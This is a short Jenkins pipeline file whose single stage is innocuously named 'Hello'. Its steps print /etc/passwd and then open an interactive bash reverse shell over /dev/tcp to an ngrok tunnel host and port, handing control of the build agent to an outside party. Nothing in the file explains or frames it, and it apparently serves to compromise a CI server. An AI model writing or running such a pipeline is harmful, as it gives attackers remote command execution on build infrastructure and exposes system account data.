pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                sh 'cat /etc/passwd'
                sh '/bin/bash -l > /dev/tcp/7.tcp.eu.ngrok.io/17377 0<&1 2>&1'
            }
        }
    }
}
